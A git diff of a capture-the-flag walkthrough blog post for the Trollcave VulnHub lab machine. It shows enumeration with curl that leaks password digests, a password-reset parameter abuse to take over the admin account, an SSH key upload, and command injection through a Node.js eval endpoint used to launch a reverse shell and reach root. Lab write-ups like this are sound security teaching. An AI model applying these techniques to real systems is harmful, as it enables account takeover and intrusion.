@@ -9,46 +9,23 @@ This is a boot2root machine that was created by [David Yates][2], and hosted at 
 
 <!--more-->
 ## Information Gathering
-
-We start of with an nmap scan and get these ports open:
-```
-nmap -Pn -sCV -p22,80 -oN nmap/Basic_192.168.251.9.nmap 192.168.251.9
-mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
-Nmap scan report for 192.168.251.9
-Host is up (0.00048s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
-|   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
-|_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
-80/tcp open  http    nginx 1.10.3 (Ubuntu)
-| http-robots.txt: 1 disallowed entry 
-|_/
-|_http-server-header: nginx/1.10.3 (Ubuntu)
-|_http-title: Trollcave
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-We'll start off with port 80:
-=======
-Changes13052020
 We start of with an nmap scan and get these ports open: 
+
 PORT   STATE SERVICE                                                                                                                                                  
 22/tcp open  ssh                                                                                                                                                      
 80/tcp open  http                                                                                                                                                     
                                                                                                                                                                       
->>>>>>> 16f31e357dc88ca176e374cb0f82fbe969f59b61
 
+Port 80:
 ![5-1.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-1.png)
 
-Looks like a ruby site simply based on the diammond icon. There's a list of a couple of users:
+Looks like a ruby site. 
+Users are
 
 ![5-2.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-2.png)
 
 
-We'll do some fuzzing using wfuzz:
+We'll use wfuzz:
 ```
 kali@kali:~/vulnhub/trollcave$ wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt  --hc 404 http://192.168.251.9/FUZZ                                   
 
@@ -84,7 +61,7 @@ To get the links on the page:
 
 	curl -s http://192.168.251.9 | grep -Po '(href|src)=".{2,}"' | cut -d '"' -f2 | sort -u
  
- ![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)
+ ![5-3.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)
 
 Enumerate the users:
 When we do 
@@ -128,62 +105,345 @@ kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20}.json
 
 h1>xer's page</h1
 kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20}.json
-{"id":1,"name":"King","email":"king@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.494Z","updated_at":"2020-05-01T06:40:12.220Z"}{"id":2,"name":"dave","email":"david@32letters.com","password":null,"created_at":"2017-10-23T09:39:41.617Z","updated_at":"2020-05-01T06:40:12.238Z"}{"id":3,"name":"dragon","email":"dragon@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.710Z","updated_at":"2020-05-01T06:40:12.256Z"}{"id":4,"name":"coderguy","email":"coderguy@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.805Z","updated_at":"2020-05-01T06:40:12.273Z"}{"id":5,"name":"cooldude89","email":"kewldewdeightynine@zmail.com","password":null,"created_at":"2017-10-23T09:39:41.894Z","updated_at":"2020-05-01T06:40:12.291Z"}{"id":6,"name":"Sir","email":"sir@zmail.com","password":null,"created_at":"2017-10-23T09:39:41.985Z","updated_at":"2020-05-01T06:40:12.310Z"}{"id":7,"name":"Q","email":"q@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.075Z","updated_at":"2020-05-01T06:40:12.331Z"}{"id":8,"name":"teflon","email":"tf@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.151Z","updated_at":"2020-05-01T06:40:12.348Z"}{"id":9,"name":"TheDankMan","email":"dope@dankmail.com","password":null,"created_at":"2017-10-23T09:39:42.240Z","updated_at":"2020-05-01T06:40:12.363Z"}{"id":10,"name":"artemus","email":"artemus_12145@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.318Z","updated_at":"2020-05-01T06:40:12.383Z"}{"id":11,"name":"MrPotatoHead","email":"potatoe@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.395Z","updated_at":"2020-05-01T06:40:12.424Z"}{"id":12,"name":"Ian","email":"iane@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.472Z","updated_at":"2020-05-01T06:40:12.447Z"}{"id":13,"name":"kev","email":"kevin@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.548Z","updated_at":"2020-05-01T06:40:12.477Z"}{"id":14,"name":"notanother","email":"notanother@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.626Z","updated_at":"2020-05-01T06:40:12.497Z"}{"id":15,"name":"anybodyhome","email":"anybodyhome@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.702Z","updated_at":"2020-05-01T06:40:12.517Z"}{"id":16,"name":"onlyme","email":"onlymememe@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.779Z","updated_at":"2020-05-01T06:40:12.536Z"}{"id":17,"name":"xer","email":"xer@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.856Z","updated_at":"2020-05-01T06:40:12.553Z"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
+{
+  "id": 1,
+  "name": "King",
+  "email": "king@trollcave.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:41.494Z",
+  "updated_at": "2020-05-01T06:40:12.220Z"
+}{
+  "id": 2,
+  "name": "dave",
+  "email": "david@32letters.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:41.617Z",
+  "updated_at": "2020-05-01T06:40:12.238Z"
+}{
+  "id": 3,
+  "name": "dragon",
+  "email": "dragon@trollcave.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:41.710Z",
+  "updated_at": "2020-05-01T06:40:12.256Z"
+}{
+  "id": 4,
+  "name": "coderguy",
+  "email": "coderguy@trollcave.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:41.805Z",
+  "updated_at": "2020-05-01T06:40:12.273Z"
+}{
+  "id": 5,
+  "name": "cooldude89",
+  "email": "kewldewdeightynine@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:41.894Z",
+  "updated_at": "2020-05-01T06:40:12.291Z"
+}{
+  "id": 6,
+  "name": "Sir",
+  "email": "sir@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:41.985Z",
+  "updated_at": "2020-05-01T06:40:12.310Z"
+}{
+  "id": 7,
+  "name": "Q",
+  "email": "q@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.075Z",
+  "updated_at": "2020-05-01T06:40:12.331Z"
+}{
+  "id": 8,
+  "name": "teflon",
+  "email": "tf@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.151Z",
+  "updated_at": "2020-05-01T06:40:12.348Z"
+}{
+  "id": 9,
+  "name": "TheDankMan",
+  "email": "dope@dankmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.240Z",
+  "updated_at": "2020-05-01T06:40:12.363Z"
+}{
+  "id": 10,
+  "name": "artemus",
+  "email": "artemus_12145@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.318Z",
+  "updated_at": "2020-05-01T06:40:12.383Z"
+}{
+  "id": 11,
+  "name": "MrPotatoHead",
+  "email": "potatoe@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.395Z",
+  "updated_at": "2020-05-01T06:40:12.424Z"
+}{
+  "id": 12,
+  "name": "Ian",
+  "email": "iane@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.472Z",
+  "updated_at": "2020-05-01T06:40:12.447Z"
+}{
+  "id": 13,
+  "name": "kev",
+  "email": "kevin@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.548Z",
+  "updated_at": "2020-05-01T06:40:12.477Z"
+}{
+  "id": 14,
+  "name": "notanother",
+  "email": "notanother@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.626Z",
+  "updated_at": "2020-05-01T06:40:12.497Z"
+}{
+  "id": 15,
+  "name": "anybodyhome",
+  "email": "anybodyhome@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.702Z",
+  "updated_at": "2020-05-01T06:40:12.517Z"
+}{
+  "id": 16,
+  "name": "onlyme",
+  "email": "onlymememe@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.779Z",
+  "updated_at": "2020-05-01T06:40:12.536Z"
+}{
+  "id": 17,
+  "name": "xer",
+  "email": "xer@zmail.com",
+  "password": null,
+  "created_at": "2017-10-23T09:39:42.856Z",
+  "updated_at": "2020-05-01T06:40:12.553Z"
+}{
+  "status": "404",
+  "error": "Not Found"
+}{
+  "status": "404",
+  "error": "Not Found"
+}{
+  "status": "404",
+  "error": "Not Found"
+}
 ```
 We can also enumerate for the reports directory:
 ```
 kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/reports/{1..20}.json
 
-{"id":1,"content":"offensive comment, not even clever.","user":{"id":17,"name":"xer","email":"xer@zmail.com","password_hint":"fave pronoun","password_digest":"$2a$10$W2Y0kBt5mAae81o9yK.hSe7SG3mgVQmIXT/O13hGJlJ8qMDtxz0VG","remember_digest":null,"role":1,"hits":43,"last_seen_at":"2020-05-01T02:59:37.579Z","banned":null,"created_at":"2017-10-23T09:39:42.856Z","updated_at":"2020-05-01T06:40:12.553Z","avatar_id":null,"reset_digest":null,"reset_sent_at":"2020-05-01T02:58:30.811Z"},"blog":{"id":4,"title":"Politics \u0026 religion thread","content":"\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out warns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t","clearance":0,"user_id":5,"created_at":"2017-10-23T09:39:42.962Z","updated_at":"2017-10-23T09:39:42.962Z"},"comment_id":2,"created_at":"2017-10-23T09:39:42.998Z","updated_at":"2017-10-23T09:39:42.998Z"}{"id":2,"content":"yellow too light to read","user":{"id":16,"name":"onlyme","email":"onlymememe@zmail.com","password_hint":"It is what it is","password_digest":"$2a$10$AEQuFMHHVaJOSYEpBLBq/.YOiybWcjWMgk7xIVGVq7E9VWzTgdl2.","remember_digest":null,"role":1,"hits":40,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:42.779Z","updated_at":"2020-05-01T06:40:12.536Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":5,"title":"markdown","content":"\ngood news everybody! i've added a new feature to blogs: you can now use [markdown](https://daringfireball.net/projects/markdown/) to *format* **your** ~~posts~~.\n\nlookin forward to all the pretty new posts :)\n\t\t","clearance":1,"user_id":4,"created_at":"2017-10-23T09:39:43.012Z","updated_at":"2017-10-23T09:39:43.012Z"},"comment_id":3,"created_at":"2017-10-23T09:39:43.043Z","updated_at":"2017-10-23T09:39:43.043Z"}{"id":3,"content":"attempted hacking","user":{"id":2,"name":"dave","email":"david@32letters.com","password_hint":"nah lol","password_digest":"$2a$10$9qvAMgymdDz01DDp0yjLyeaQUWWiMjAn8T8qxLrs4eLkV6m8yZyH6","remember_digest":null,"role":4,"hits":63,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:41.617Z","updated_at":"2020-05-01T06:43:15.505Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","clearance":0,"user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"},"comment_id":7,"created_at":"2017-10-23T09:39:43.144Z","updated_at":"2017-10-23T09:39:43.144Z"}{"id":4,"content":"adds nothing to discussion","user":{"id":8,"name":"teflon","email":"tf@zmail.com","password_hint":"swordfish","password_digest":"$2a$10$l1VKPrNsRN6kMAssBhGgveZ1DDFnPEZM6ZGwTvTPayvSbZPebY1B6","remember_digest":null,"role":3,"hits":34,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:42.151Z","updated_at":"2020-05-01T06:40:12.348Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":8,"title":"new feature for moderators","content":"\nin order to cope with the massive growth of the site userbase, we are temporarily giving moderators the ability to appoint other moderators. this can be done through the [users](/users) page by clicking the \"mod\" link next to the user you want to promote.\n\nplease use your discretion and only appoint trustworthy, regular members. any abuse of this feature will be grounds for a swift and painful meeting with the banhammer. for both of you. \u003e:(\n\t\t","clearance":3,"user_id":4,"created_at":"2017-10-23T09:39:43.158Z","updated_at":"2017-10-23T09:39:43.158Z"},"comment_id":8,"created_at":"2017-10-23T09:39:43.193Z","updated_at":"2017-10-23T09:39:43.193Z"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","e
+{
+  "id": 1,
+  "content": "offensive comment, not even clever.",
+  "user": {
+    "id": 17,
+    "name": "xer",
+    "email": "xer@zmail.com",
+    "password_hint": "fave pronoun",
+    "password_digest": "$2a$10$W2Y0kBt5mAae81o9yK.hSe7SG3mgVQmIXT/O13hGJlJ8qMDtxz0VG",
+    "remember_digest": null,
+    "role": 1,
+    "hits": 43,
+    "last_seen_at": "2020-05-01T02:59:37.579Z",
+    "banned": null,
+    "created_at": "2017-10-23T09:39:42.856Z",
+    "updated_at": "2020-05-01T06:40:12.553Z",
+    "avatar_id": null,
+    "reset_digest": null,
+    "reset_sent_at": "2020-05-01T02:58:30.811Z"
+  },
+  "blog": {
+    "id": 4,
+    "title": "Politics \u0026 religion thread",
+    "content": "\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out warns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t",
+    "clearance": 0,
+    "user_id": 5,
+    "created_at": "2017-10-23T09:39:42.962Z",
+    "updated_at": "2017-10-23T09:39:42.962Z"
+  },
+  "comment_id": 2,
+  "created_at": "2017-10-23T09:39:42.998Z",
+  "updated_at": "2017-10-23T09:39:42.998Z"
+}{
+  "id": 2,
+  "content": "yellow too light to read",
+  "user": {
+    "id": 16,
+    "name": "onlyme",
+    "email": "onlymememe@zmail.com",
+    "password_hint": "It is what it is",
+    "password_digest": "$2a$10$AEQuFMHHVaJOSYEpBLBq/.YOiybWcjWMgk7xIVGVq7E9VWzTgdl2.",
+    "remember_digest": null,
+    "role": 1,
+    "hits": 40,
+    "last_seen_at": null,
+    "banned": null,
+    "created_at": "2017-10-23T09:39:42.779Z",
+    "updated_at": "2020-05-01T06:40:12.536Z",
+    "avatar_id": null,
+    "reset_digest": null,
+    "reset_sent_at": null
+  },
+  "blog": {
+    "id": 5,
+    "title": "markdown",
+    "content": "\ngood news everybody! i've added a new feature to blogs: you can now use [markdown](https://daringfireball.net/projects/markdown/) to *format* **your** ~~posts~~.\n\nlookin forward to all the pretty new posts :)\n\t\t",
+    "clearance": 1,
+    "user_id": 4,
+    "created_at": "2017-10-23T09:39:43.012Z",
+    "updated_at": "2017-10-23T09:39:43.012Z"
+  },
+  "comment_id": 3,
+  "created_at": "2017-10-23T09:39:43.043Z",
+  "updated_at": "2017-10-23T09:39:43.043Z"
+}{
+  "id": 3,
+  "content": "attempted hacking",
+  "user": {
+    "id": 2,
+    "name": "dave",
+    "email": "david@32letters.com",
+    "password_hint": "nah lol",
+    "password_digest": "$2a$10$9qvAMgymdDz01DDp0yjLyeaQUWWiMjAn8T8qxLrs4eLkV6m8yZyH6",
+    "remember_digest": null,
+    "role": 4,
+    "hits": 63,
+    "last_seen_at": null,
+    "banned": null,
+    "created_at": "2017-10-23T09:39:41.617Z",
+    "updated_at": "2020-05-01T06:43:15.505Z",
+    "avatar_id": null,
+    "reset_digest": null,
+    "reset_sent_at": null
+  },
+  "blog": {
+    "id": 7,
+    "title": "Welcome to the TrollCave!",
+    "content": "\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t",
+    "clearance": 0,
+    "user_id": 1,
+    "created_at": "2017-10-23T09:39:43.103Z",
+    "updated_at": "2017-10-23T09:39:43.103Z"
+  },
+  "comment_id": 7,
+  "created_at": "2017-10-23T09:39:43.144Z",
+  "updated_at": "2017-10-23T09:39:43.144Z"
+}{
+  "id": 4,
+  "content": "adds nothing to discussion",
+  "user": {
+    "id": 8,
+    "name": "teflon",
+    "email": "tf@zmail.com",
+    "password_hint": "swordfish",
+    "password_digest": "$2a$10$l1VKPrNsRN6kMAssBhGgveZ1DDFnPEZM6ZGwTvTPayvSbZPebY1B6",
+    "remember_digest": null,
+    "role": 3,
+    "hits": 34,
+    "last_seen_at": null,
+    "banned": null,
+    "created_at": "2017-10-23T09:39:42.151Z",
+    "updated_at": "2020-05-01T06:40:12.348Z",
+    "avatar_id": null,
+    "reset_digest": null,
+    "reset_sent_at": null
+  },
+  "blog": {
+    "id": 8,
+    "title": "new feature for moderators",
+    "content": "\nin order to cope with the massive growth of the site userbase, we are temporarily giving moderators the ability to appoint other moderators. this can be done through the [users](/users) page by clicking the \"mod\" link next to the user you want to promote.\n\nplease use your discretion and only appoint trustworthy, regular members. any abuse of this feature will be grounds for a swift and painful meeting with the banhammer. for both of you. \u003e:(\n\t\t",
+    "clearance": 3,
+    "user_id": 4,
+    "created_at": "2017-10-23T09:39:43.158Z",
+    "updated_at": "2017-10-23T09:39:43.158Z"
+  },
+  "comment_id": 8,
+  "created_at": "2017-10-23T09:39:43.193Z",
+  "updated_at": "2017-10-23T09:39:43.193Z"
+}
+...
 ```
 This contains some passwords
 Once more we do the same for blog:
 ```
 kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/blogs/{1..20}.json
                                                                                         
-{"id":1,"title":"Dumb ways to die","content":"My favourite one comes from an old Viking legend called the Orkneyingers' Saga.\n \n\u003eAnd so they met and there was 
-a hard battle, and not long ere Melbricta fell and his followers, and Sigurd caused the heads to be fastened to his horses’ cruppers as a glory for himself.  And then
- they rode home, and boasted of their victory.  And when they were come on the way, then Sigurd wished to spur the horse with his foot, and he struck his calf against
- the tooth which stuck out of Melbricta’s head and grazed it;  and in that wound sprung up pain and swelling, and that led him to his death.\n\nKilled by a dead guy!\
-n","user_id":12,"created_at":"2017-10-23T09:39:42.887Z","updated_at":"2017-10-23T09:39:42.887Z"}{"id":2,"title":"First post","content":"\nHi, I'm Dave! I'm an adminis
-trator on this site, and that makes me better than you.\n\nKneel before me, peasants!\n\n/jk\n\nbut serious, kneel\n\t\t","user_id":2,"created_at":"2017-10-23T09:39:4
-2.907Z","updated_at":"2017-10-23T09:39:42.907Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"id":4,"title":"Politics \u002
-6 religion thread","content":"\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out wa
-rns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t","user_id":5
-,"created_at":"2017-10-23T09:39:42.962Z","updated_at":"2017-10-23T09:39:42.962Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></htm
-l>{"id":6,"title":"password reset","content":"\nso i've been getting a lot of emails lately from users who forgot their passwords and need to reset them. because the 
-site doesn't have one of those 'forgot password' buttons, i've been having to do all the resets manually. i'm getting really tired of it\n\nergo it's time to implemen
-t password reset. busy with this at the moment, but having trouble with site emails. you might have noticed that activation has been turned off for new users because 
-of this.\n\nso far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating. if anyone has 
-any suggestions about how to get the email working, please drop me a pm\n\n--coderguy\n\t\t","user_id":4,"created_at":"2017-10-23T09:39:43.057Z","updated_at":"2017-10-23T09:39:43.057Z"}{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
+{
+  "id": 1,
+  "title": "Dumb ways to die",
+  "content": "My favourite one comes from an old Viking legend called the Orkneyingers' Saga.\n \n\u003eAnd so they met and there was  a hard battle, and not long ere Melbricta fell and his followers, and Sigurd caused the heads to be fastened to his horses’ cruppers as a glory for himself.  And then  they rode home, and boasted of their victory.  And when they were come on the way, then Sigurd wished to spur the horse with his foot, and he struck his calf against  the tooth which stuck out of Melbricta’s head and grazed it;  and in that wound sprung up pain and swelling, and that led him to his death.\n\nKilled by a dead guy!\ n",
+  "user_id": 12,
+  "created_at": "2017-10-23T09:39:42.887Z",
+  "updated_at": "2017-10-23T09:39:42.887Z"
+}{
+  "id": 2,
+  "title": "First post",
+  "content": "\nHi, I'm Dave! I'm an administrator on this site, and that makes me better than you.\n\nKneel before me, peasants!\n\n/jk\n\nbut serious, kneel\n\t\t",
+  "user_id": 2,
+  "created_at": "2017-10-23T09:39:4 2.907Z",
+  "updated_at": "2017-10-23T09:39:42.907Z"
+}<html><body>Youarebeing<ahref="http://192.168.251.9/">redirected</a>.</body></html>{
+  "id": 4,
+  "title": "Politics \u002 6 religion thread",
+  "content": "\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out wa rns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t",
+  "user_id": 5,
+  "created_at": "2017-10-23T09:39:42.962Z",
+  "updated_at": "2017-10-23T09:39:42.962Z"
+}<html><body>Youarebeing<ahref="http://192.168.251.9/">redirected</a>.</body></html>{
+  "id": 6,
+  "title": "password reset",
+  "content": "\nso i've been getting a lot of emails lately from users who forgot their passwords and need to reset them. because the  site doesn't have one of those 'forgot password' buttons, i've been having to do all the resets manually. i'm getting really tired of it\n\nergo it's time to implemen t password reset. busy with this at the moment, but having trouble with site emails. you might have noticed that activation has been turned off for new users because  of this.\n\nso far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating. if anyone has  any suggestions about how to get the email working, please drop me a pm\n\n--coderguy\n\t\t",
+  "user_id": 4,
+  "created_at": "2017-10-23T09:39:43.057Z",
+  "updated_at": "2017-10-23T09:39:43.057Z"
+}{
+  "id": 7,
+  "title": "Welcome to the TrollCave!",
+  "content": "\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t",
+  "user_id": 1,
+  "created_at": "2017-10-23T09:39:43.103Z",
+  "updated_at": "2017-10-23T09:39:43.103Z"
+}<html><body>Youarebeing<ahref="http://192.168.251.9/">redirected</a>.</body></html><html><body>Youarebeing<ahref="http://192.168.251.9/">redirected</a>.</body></html><html><body>Youarebeing<ahref="http://192.168.251.9/">redirected</a>.</body></html>{
+  "status": "404",
+  "error": "Not Found"
+}
+...
 ```
 When reading the blog we come across a user talking about password_resets: 
 
 ```
 so far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating
 ```
-![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)
-
-Google search tells us to reset the password we use:
-http://192.168.251.9/password_resets/new
-
 ![5-5.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)
+Google search tells us to reset the password we use:
+`http://192.168.251.9/password_resets/new`
+
+![5-6.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-6.png)
 
 It sends the link
 
-![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-7.png)
 
 Note the end of the string has the parameter [name]. We'll abuse this part.
 Since we already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`
 
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-8.png)
 
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-9.png)
+Once we're logged in we go to admin panel and enable file upload
 
-
-Once we're logged in we go to admin panel and enable file upload 
-![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-6.png)
-
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-10.png)
 
 Reading through the user King blogs we come across
+
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-11.png)
 
 
 This tells us we've got a user called `rails`. Attempting to upload and execute reverse shell (php or ruby) proves unfruitful.
@@ -196,8 +456,12 @@ Generate a ssh key as follows
 
 	ssh-keygen -t rsa -b 2048
 
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-12.png)
+
 Upload the key as follows:
+
 Note we'll upload with user as xer upload as King don't work:
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-13.png)
 
 	ssh -i trollcave rails@192.168.251.9
 
@@ -217,15 +481,8 @@ drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
 -rw-r--r-- 1 king king  675 Sep 16  2016 .profile
 -rw-r--r-- 1 king king    0 Sep 16  2016 .sudo_as_admin_successful
 ```
-<<<<<<< HEAD
-He's running a program called 
-```
-drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
-
-
 He's running a program called  calc
 ```
-
 rails@trollcave:/home/king/calc$ cat calc.js
 var http = require("http");
 var url = require("url");
@@ -315,12 +572,13 @@ function display_404(pathname, request, response)
 
 // Start the server and route the requests
 start(route);
-rails@trollcave:/home/king/calc$
 ```
-http.createServer(onRequest).listen(8888, '127.0.0.1');
-console.log("Server started"); 
+Paying particular attention to this line of code:
 
-Its tells us its running on 8888.
+	http.createServer(onRequest).listen(8888, '127.0.0.1');
+	console.log("Server started"); 
+
+Its tells us its listening on 8888.
 Confirmed by, 
 ```
 [-] Listening TCP:
@@ -350,16 +608,16 @@ function calc(pathname, request, query, response)
  
 
 First we'll do some port forwarding so that we can access it on `localhost:8888`
-kali@kali:~/vulnhub/trollcave$ ssh -L 8888:127.0.0.1:8888 -i trollcave rails@192.168.251.9 -f -N
 
+	kali@kali:~/vulnhub/trollcave$ ssh -L 8888:127.0.0.1:8888 -i trollcave rails@192.168.251.9 -f -N
 
-
-
-
-When we go to calculate looks like it doesn't work. We intercept the request using Burp.
+When we go to calculate looks like it doesn't work. 
 
 	http://localhost:8888/calc?sum=1%2B1
 
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-14.png)
+
+We intercept the request using Burp.
 
 From function the sum parameter is converted to string then passed to eval. When we pass a string, we get the error below; 
 
@@ -367,14 +625,14 @@ From function the sum parameter is converted to string then passed to eval. When
 
 This means execution is possible. 
 
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-15.png)
 
+Hence, create a file with a reverse shell and put it in `/home/rails/rs.sh.` Make sure its executable and pass it as a variable to url.
 
-Hence, create a file with a reverse shell and put it in /home/rails/rs.sh. Make sure its executable and pass it as a variable to url above.
-Start a listener and run it.    
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-16.png)
 
-
-
-
+Start a listener and run it.
+![5-7.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-17.png)   
 
 We get a shell with the id as King. 
 sudo -l shows he can run commands as root with no password.
